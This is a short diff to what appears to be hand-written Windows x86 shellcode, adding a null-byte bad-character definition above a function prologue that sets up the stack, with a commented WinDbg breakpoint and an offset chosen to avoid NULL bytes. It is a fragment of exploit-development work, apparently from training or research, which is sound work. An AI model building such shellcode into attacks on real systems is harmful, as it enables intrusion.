@@ -1,4 +1,6 @@
- start:                            
+badchars = b"\x00"
+
+start:                            
 #    int3;                             # Set bp in Windbg. REMOVE WHEN NOT DEBUGGING!
     mov   ebp, esp;                   # Simulate start of function call (set new base as current top of stack)
     add   esp, 0xfffff9f0;            # Decrement esp to provide space for the frame (avoid NULL bytes)
